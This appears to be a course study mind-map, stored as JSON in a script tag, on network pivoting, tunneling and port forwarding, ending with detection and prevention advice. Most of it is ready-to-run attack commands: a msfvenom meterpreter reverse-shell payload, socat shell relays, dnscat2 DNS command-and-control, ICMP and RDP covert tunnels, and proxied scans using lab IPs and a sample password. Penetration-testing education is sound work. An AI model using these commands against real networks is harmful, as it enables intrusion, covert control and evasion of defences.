  <script>
    const data = {"content":"Pivoting, Tunneling, and Port Forwarding","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"Move deeper into networks you cannot reach directly by routing traffic through an already-compromised &quot;pivot host&quot; (proxy / foothold / jump host).","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Pivoting = crossing network boundaries via a dual-homed compromised host; Tunneling = encapsulating traffic in another protocol (HTTP/SSH/DNS/ICMP) to bypass firewalls and evade detection; Lateral movement = spreading across hosts.","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"Master many Linux and Windows tools for local/remote/dynamic port forwarding, SOCKS proxying, and protocol tunneling, plus how defenders detect and prevent them.","children":[],"payload":{"tag":"li","lines":"4,6"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"Networking Behind Pivoting","children":[{"content":"Enumerate NICs/IPs, subnets, gateway, and routing to find reachable internal networks (a second NIC = dual-homed pivot).","children":[],"payload":{"tag":"li","lines":"8,9"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ifconfig<\/code> / <code>ipconfig<\/code> &#x2014; Display network configuration (Linux / Windows).","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"<code>netstat -r<\/code> &#x2014; Display the IPv4 routing table.","children":[],"payload":{"tag":"li","lines":"11,12"}},{"content":"<code>nmap -sT -p22,3306 &lt;target&gt;<\/code> &#x2014; Scan for SSH/MySQL open ports.","children":[],"payload":{"tag":"li","lines":"12,14"}}],"payload":{"tag":"li","lines":"9,14"}}],"payload":{"tag":"h3","lines":"7,8"}},{"content":"SSH Local Port Forwarding (-L)","children":[{"content":"Pull a remote host&apos;s local-only service back to a port on the attack host to reach/exploit it locally.","children":[],"payload":{"tag":"li","lines":"15,16"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ssh -L 1234:localhost:3306 Ubuntu@&lt;target&gt;<\/code> &#x2014; Forward local 1234 to remote 3306.","children":[],"payload":{"tag":"li","lines":"17,18"}},{"content":"<code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;target&gt;<\/code> &#x2014; Forward multiple ports.","children":[],"payload":{"tag":"li","lines":"18,19"}},{"content":"<code>netstat -antp | grep 1234<\/code> &#x2014; Verify the tunnel.","children":[],"payload":{"tag":"li","lines":"19,20"}},{"content":"<code>nmap -v -sV -p1234 localhost<\/code> &#x2014; Scan the service through the local port.","children":[],"payload":{"tag":"li","lines":"20,22"}}],"payload":{"tag":"li","lines":"16,22"}}],"payload":{"tag":"h3","lines":"14,15"}},{"content":"SSH Dynamic Port Forwarding + SOCKS Tunneling (-D)","children":[{"content":"Open a SOCKS proxy over SSH so arbitrary tools route through the pivot into unreachable subnets via proxychains.","children":[],"payload":{"tag":"li","lines":"23,24"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ssh -D 9050 ubuntu@&lt;target&gt;<\/code> &#x2014; Dynamic port forward / SOCKS proxy on 9050.","children":[],"payload":{"tag":"li","lines":"25,26"}},{"content":"<code>tail -4 /etc/proxychains.conf<\/code> &#x2014; Confirm SOCKS config (<code>socks4 127.0.0.1 9050<\/code>).","children":[],"payload":{"tag":"li","lines":"26,27"}},{"content":"<code>proxychains nmap -v -sn 172.16.5.1-200<\/code> &#x2014; Proxied host discovery.","children":[],"payload":{"tag":"li","lines":"27,28"}},{"content":"<code>proxychains nmap -v -Pn -sT 172.16.5.19<\/code> &#x2014; Proxied TCP connect scan (<code>-sT<\/code> required).","children":[],"payload":{"tag":"li","lines":"28,29"}},{"content":"<code>proxychains msfconsole<\/code> &#x2014; Route Metasploit through the proxy.","children":[],"payload":{"tag":"li","lines":"29,30"}},{"content":"<code>proxychains xfreerdp /v:&lt;target&gt; /u:victor /p:pass@123<\/code> &#x2014; Proxied RDP.","children":[],"payload":{"tag":"li","lines":"30,32"}}],"payload":{"tag":"li","lines":"24,32"}}],"payload":{"tag":"h3","lines":"22,23"}},{"content":"SSH Remote / Reverse Port Forwarding (-R)","children":[{"content":"Push a listener out to the pivot so a deep target can reach your attack-host handler and return a reverse shell.","children":[],"payload":{"tag":"li","lines":"33,34"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>ssh -R &lt;PivotIP&gt;:8080:0.0.0.0:80 ubuntu@&lt;target&gt; -vN<\/code> &#x2014; Reverse tunnel (pivot 8080 &#x2192; attack 80).","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;attack&gt; LPORT=8080 -f elf -o backupjob<\/code> &#x2014; Linux reverse payload.","children":[],"payload":{"tag":"li","lines":"36,37"}},{"content":"<code>msf6 &gt; use exploit/multi/handler<\/code> &#x2014; Catch the reverse connection.","children":[],"payload":{"tag":"li","lines":"37,39"}}],"payload":{"tag":"li","lines":"34,39"}}],"payload":{"tag":"h3","lines":"32,33"}},{"content":"Meterpreter Tunneling &amp; Port Forwarding","children":[{"content":"Use an existing Meterpreter session on the pivot: autoroute adds internal routes, socks_proxy spins a SOCKS listener, portfwd creates TCP relays.","children":[],"payload":{"tag":"li","lines":"40,41"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>msf6 &gt; use post/multi/manage/autoroute<\/code> &#x2014; Add routes to the internal subnet.","children":[],"payload":{"tag":"li","lines":"42,43"}},{"content":"<code>msf6 &gt; use auxiliary/server/socks_proxy<\/code> &#x2014; Start a SOCKS listener; <code>jobs<\/code> to confirm.","children":[],"payload":{"tag":"li","lines":"43,44"}},{"content":"<code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;target&gt;<\/code> &#x2014; Local forward (local 3300 &#x2192; target RDP 3389).","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"<code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;attack&gt;<\/code> &#x2014; Reverse forward.","children":[],"payload":{"tag":"li","lines":"45,46"}},{"content":"<code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123<\/code> &#x2014; RDP through the forward.","children":[],"payload":{"tag":"li","lines":"46,47"}},{"content":"<code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23<\/code> &#x2014; Ping-sweep enumeration.","children":[],"payload":{"tag":"li","lines":"47,48"}},{"content":"<code>meterpreter &gt; bg<\/code> &#x2014; Background the session.","children":[],"payload":{"tag":"li","lines":"48,50"}}],"payload":{"tag":"li","lines":"41,50"}}],"payload":{"tag":"h3","lines":"39,40"}},{"content":"Ping-Sweep Host Discovery (one-liners)","children":[{"content":"Discover live internal hosts from the pivot when scanners are slow/blocked.","children":[],"payload":{"tag":"li","lines":"51,52"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>for i in {1..254} ;do (ping -c 1 172.16.5.&#x24;i | grep &quot;bytes from&quot; &amp;) ;done<\/code> &#x2014; Linux sweep.","children":[],"payload":{"tag":"li","lines":"53,54"}},{"content":"<code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;<\/code> &#x2014; Windows cmd sweep.","children":[],"payload":{"tag":"li","lines":"54,55"}},{"content":"<code>1..254 | % {&quot;172.16.5.&#x24;(&#x24;_): &#x24;(Test-Connection -count 1 -comp 172.15.5.&#x24;(&#x24;_) -quiet)&quot;}<\/code> &#x2014; PowerShell sweep.","children":[],"payload":{"tag":"li","lines":"55,57"}}],"payload":{"tag":"li","lines":"52,57"}}],"payload":{"tag":"h3","lines":"50,51"}},{"content":"Socat Redirection &#x2014; Reverse &amp; Bind Shell","children":[{"content":"Standalone bidirectional relay/redirector on the pivot; no SSH needed.","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>socat TCP4-LISTEN:8080,fork TCP4:&lt;attack&gt;:80<\/code> &#x2014; Relay a reverse shell to the attack host.","children":[],"payload":{"tag":"li","lines":"60,61"}},{"content":"<code>socat TCP4-LISTEN:8080,fork TCP4:&lt;target&gt;:8443<\/code> &#x2014; Relay a bind-shell connection to the target.","children":[],"payload":{"tag":"li","lines":"61,63"}}],"payload":{"tag":"li","lines":"59,63"}}],"payload":{"tag":"h3","lines":"57,58"}},{"content":"SSH for Windows &#x2014; plink.exe","children":[{"content":"Living-off-the-land SSH on Windows pivots for dynamic forwards / SOCKS (pair with Proxifier for GUI apps).","children":[],"payload":{"tag":"li","lines":"64,65"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>plink -D 9050 ubuntu@&lt;target&gt;<\/code> &#x2014; Dynamic port forward from a Windows host.","children":[],"payload":{"tag":"li","lines":"66,68"}}],"payload":{"tag":"li","lines":"65,68"}}],"payload":{"tag":"h3","lines":"63,64"}},{"content":"SSH Pivoting with sshuttle","children":[{"content":"&quot;Poor man&apos;s VPN&quot; over SSH; auto-configures iptables so you tunnel a whole subnet without proxychains (SSH only).","children":[],"payload":{"tag":"li","lines":"69,70"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>sudo apt-get install sshuttle<\/code> &#x2014; Install sshuttle.","children":[],"payload":{"tag":"li","lines":"71,72"}},{"content":"<code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v<\/code> &#x2014; Route the internal network over SSH.","children":[],"payload":{"tag":"li","lines":"72,74"}}],"payload":{"tag":"li","lines":"70,74"}}],"payload":{"tag":"h3","lines":"68,69"}},{"content":"Web Server Pivoting with rpivot","children":[{"content":"Reverse SOCKS proxy (Python2): internal client back-connects to server.py on the attack host; NTLM-proxy aware.","children":[],"payload":{"tag":"li","lines":"75,76"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>sudo git clone https://github.com/klsecservices/rpivot.git<\/code> &#x2014; Clone rpivot.","children":[],"payload":{"tag":"li","lines":"77,78"}},{"content":"<code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0<\/code> &#x2014; Run server on attack host.","children":[],"payload":{"tag":"li","lines":"78,79"}},{"content":"<code>scp -r rpivot ubuntu@&lt;target&gt;<\/code> &#x2014; Copy rpivot to the pivot.","children":[],"payload":{"tag":"li","lines":"79,80"}},{"content":"<code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999<\/code> &#x2014; Connect client back.","children":[],"payload":{"tag":"li","lines":"80,81"}},{"content":"<code>python client.py --server-ip &lt;web&gt; --server-port 8080 --ntlm-proxy-ip &lt;proxy&gt; --ntlm-proxy-port 8081 --domain &lt;dom&gt; --username &lt;u&gt; --password &lt;p&gt;<\/code> &#x2014; Through an NTLM HTTP proxy.","children":[],"payload":{"tag":"li","lines":"81,82"}},{"content":"<code>proxychains firefox-esr &lt;webserver&gt;:80<\/code> &#x2014; Browse internal web via proxy.","children":[],"payload":{"tag":"li","lines":"82,84"}}],"payload":{"tag":"li","lines":"76,84"}}],"payload":{"tag":"h3","lines":"74,75"}},{"content":"Port Forwarding with Windows netsh","children":[{"content":"Native Windows portproxy rule on a compromised Windows pivot.","children":[],"payload":{"tag":"li","lines":"85,86"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25<\/code> &#x2014; Forward 8080 &#x2192; internal RDP.","children":[],"payload":{"tag":"li","lines":"87,88"}},{"content":"<code>netsh.exe interface portproxy show v4tov4<\/code> &#x2014; View the rule.","children":[],"payload":{"tag":"li","lines":"88,90"}}],"payload":{"tag":"li","lines":"86,90"}}],"payload":{"tag":"h3","lines":"84,85"}},{"content":"DNS Tunneling with dnscat2","children":[{"content":"Stealthy encrypted C2 carried inside DNS records to bypass firewalls that strip HTTPS.","children":[],"payload":{"tag":"li","lines":"91,92"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>git clone https://github.com/iagox86/dnscat2.git<\/code> &#x2014; Clone dnscat2.","children":[],"payload":{"tag":"li","lines":"93,94"}},{"content":"<code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache<\/code> &#x2014; Start server.","children":[],"payload":{"tag":"li","lines":"94,95"}},{"content":"<code>Import-Module dnscat2.ps1<\/code> &#x2014; Import the PowerShell client (dnscat2-powershell).","children":[],"payload":{"tag":"li","lines":"95,96"}},{"content":"<code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret &lt;secret&gt; -Exec cmd<\/code> &#x2014; Connect client back.","children":[],"payload":{"tag":"li","lines":"96,97"}},{"content":"<code>dnscat2&gt; window -i 1<\/code> &#x2014; Interact with the session.","children":[],"payload":{"tag":"li","lines":"97,99"}}],"payload":{"tag":"li","lines":"92,99"}}],"payload":{"tag":"h3","lines":"90,91"}},{"content":"SOCKS5 Tunneling with Chisel","children":[{"content":"Go tool: TCP/UDP tunnel over HTTP (SSH-secured); forward and reverse pivot modes.","children":[],"payload":{"tag":"li","lines":"100,101"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>./chisel server -v -p 1234 --socks5<\/code> &#x2014; Start chisel server on the pivot.","children":[],"payload":{"tag":"li","lines":"102,103"}},{"content":"<code>./chisel client -v 10.129.202.64:1234 socks<\/code> &#x2014; Connect client, open local SOCKS5 (1080).","children":[],"payload":{"tag":"li","lines":"103,105"}}],"payload":{"tag":"li","lines":"101,105"}}],"payload":{"tag":"h3","lines":"99,100"}},{"content":"ICMP Tunneling with ptunnel-ng","children":[{"content":"Encapsulate TCP inside ICMP echo packets; works wherever outbound ping is allowed.","children":[],"payload":{"tag":"li","lines":"106,107"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>git clone https://github.com/utoni/ptunnel-ng.git<\/code> + <code>sudo ./autogen.sh<\/code> &#x2014; Clone and build.","children":[],"payload":{"tag":"li","lines":"108,109"}},{"content":"<code>sudo ./ptunnel-ng -r10.129.202.64 -R22<\/code> &#x2014; Start server on the pivot.","children":[],"payload":{"tag":"li","lines":"109,110"}},{"content":"<code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22<\/code> &#x2014; Connect client (local port 2222).","children":[],"payload":{"tag":"li","lines":"110,111"}},{"content":"<code>ssh -p2222 -lubuntu 127.0.0.1<\/code> &#x2014; SSH through the ICMP tunnel (add <code>-D 9050<\/code> for SOCKS).","children":[],"payload":{"tag":"li","lines":"111,113"}}],"payload":{"tag":"li","lines":"107,113"}}],"payload":{"tag":"h3","lines":"105,106"}},{"content":"RDP &amp; SOCKS Tunneling with SocksOverRDP","children":[{"content":"Windows-only: tunnel packets over an RDP connection&apos;s Dynamic Virtual Channels (DVC); route apps with Proxifier.","children":[],"payload":{"tag":"li","lines":"114,115"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>regsvr32.exe SocksOverRDP-Plugin.dll<\/code> &#x2014; Register the plugin.","children":[],"payload":{"tag":"li","lines":"116,117"}},{"content":"<code>netstat -antb | findstr 1080<\/code> &#x2014; Confirm the local SOCKS listener (127.0.0.1:1080).","children":[],"payload":{"tag":"li","lines":"117,119"}}],"payload":{"tag":"li","lines":"115,119"}}],"payload":{"tag":"h3","lines":"113,114"}}],"payload":{"tag":"h2","lines":"6,7"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"Port forwarding types &#x2014; Local (<code>-L<\/code>), Remote/Reverse (<code>-R<\/code>), Dynamic/SOCKS (<code>-D<\/code>).","children":[],"payload":{"tag":"li","lines":"120,121"}},{"content":"SOCKS proxy &#x2014; SOCKS4 (no auth/UDP) vs SOCKS5 (auth + UDP); client-initiated routing.","children":[],"payload":{"tag":"li","lines":"121,122"}},{"content":"proxychains &#x2014; Forces a tool&apos;s TCP through SOCKS/HTTP proxies (<code>/etc/proxychains.conf<\/code>); only full TCP connect (<code>-sT<\/code>) scans work.","children":[],"payload":{"tag":"li","lines":"122,123"}},{"content":"SSH (-L/-R/-D/-vN) + scp &#x2014; Core forwarding and payload transfer.","children":[],"payload":{"tag":"li","lines":"123,124"}},{"content":"Metasploit autoroute / socks_proxy / portfwd / multi/handler / msfvenom &#x2014; In-session pivoting.","children":[],"payload":{"tag":"li","lines":"124,125"}},{"content":"Socat &#x2014; Standalone relay (reverse + bind), no SSH.","children":[],"payload":{"tag":"li","lines":"125,126"}},{"content":"Plink / Proxifier &#x2014; Windows SSH forwarding and routing GUI apps through SOCKS.","children":[],"payload":{"tag":"li","lines":"126,127"}},{"content":"sshuttle / rpivot / netsh portproxy &#x2014; VPN-like SSH tunnel / reverse SOCKS web pivot / native Windows forwarding.","children":[],"payload":{"tag":"li","lines":"127,128"}},{"content":"Chisel / dnscat2 / ptunnel-ng / SocksOverRDP &#x2014; HTTP / DNS / ICMP / RDP covert tunnels.","children":[],"payload":{"tag":"li","lines":"128,129"}},{"content":"Pivot host identification &#x2014; Check privilege, connections, multiple NICs (dual-homed), VPN/remote software.","children":[],"payload":{"tag":"li","lines":"129,131"}}],"payload":{"tag":"h2","lines":"119,120"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations (Detection &amp; Prevention)","children":[{"content":"Baseline &amp; documentation &#x2014; Maintain DNS/DHCP/backup records, host &amp; app inventory, list of dual-homed hosts and privileged users, current network diagram; monitor critical assets.","children":[],"payload":{"tag":"li","lines":"132,133"}},{"content":"People &#x2014; Security awareness, address BYOD/remote risk, enforce MFA (esp. admins), SOC monitoring, practiced incident response.","children":[],"payload":{"tag":"li","lines":"133,134"}},{"content":"Process &#x2014; Documented policies, asset management, access control + provisioning, standardized hardening/gold images, change management, DR plan.","children":[],"payload":{"tag":"li","lines":"134,135"}},{"content":"Technology &#x2014; Firewalls, network segmentation, IDS/IPS (network + host), event logging into a SIEM, DMZ for internet-facing hosts, separate production vs management networks, restrict standard users from infrastructure.","children":[],"payload":{"tag":"li","lines":"135,136"}},{"content":"MITRE ATT&amp;CK defenses &#x2014; External/Remote Services (T1133/T1021: segment, MFA, VPN, OOB mgmt); Non-Standard Ports (T1571: baseline + NIDS); Protocol Tunneling (T1572: lock down ports, block external DNS, watch beaconing); Proxy Use (T1090: allow/deny lists); LOTL (baseline behavior, EDR, SIEM).","children":[],"payload":{"tag":"li","lines":"136,137"}}],"payload":{"tag":"h2","lines":"131,132"}}],"payload":{"tag":"h1","lines":"0,1"}}
